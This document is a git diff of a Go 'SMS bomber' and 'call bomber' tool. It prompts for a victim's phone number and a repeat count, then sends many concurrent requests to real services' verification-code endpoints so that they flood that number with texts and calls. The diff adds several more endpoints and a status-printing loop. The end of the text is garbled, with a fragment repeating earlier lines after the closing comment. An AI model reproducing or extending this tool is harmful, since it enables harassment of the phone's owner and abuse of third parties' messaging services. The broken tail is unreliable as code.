@@ -48,13 +48,14 @@ func main() {
 	// yellow := "\033[01;33m"
 	clearScreen()
 	fmt.Println("\033[01;33m")
+	fmt.Println(` ????? ?? ???? ????? `)
 	fmt.Println(` 
 codded by bridgezan                                                                                                                                                 												 
 
 	`)
 	var phone string
-	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
-	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
+	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33m spamm god ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
+	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09129999999]: \033[00;36m")
 	fmt.Scan(&phone)
 
 	var repeatCount int
@@ -659,6 +660,34 @@ codded by bridgezan
 			s56: phone,
 		}, ch)
 		go sms("https://client.api.paklean.com/user/resendVoiceCode", map[string]interface{}{
+			"username": phone,
+		}, ch)
+		go sms("https://web.raghamapp.com/api/users/code", map[string]interface{}{
+			"phone": phone,
+		}, ch)
+		go sms("https://gateway.trip.ir/api/registers", map[string]interface{}{
+			"CellPhone": phone,
+		}, ch)
+		go sms("https://gateway.trip.ir/api/Totp", map[string]interface{}{
+			"PhoneNumber": phone,
+		}, ch)
+
+	}
+
+	for i := 0; i < repeatCount*183; i++ {
+		statusCode := <-ch
+		if statusCode == 404 || statusCode == 400 {
+			fmt.Println("\033[01;31m[-] Error ! ")
+		} else {
+			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
+		}
+
+	}
+}
+
+/*
+tamom ez !
+*/nterface{}{
 			"username": phone,
 		}, ch)
 		go sms("https://web.raghamapp.com/api/users/code", map[string]interface{}{
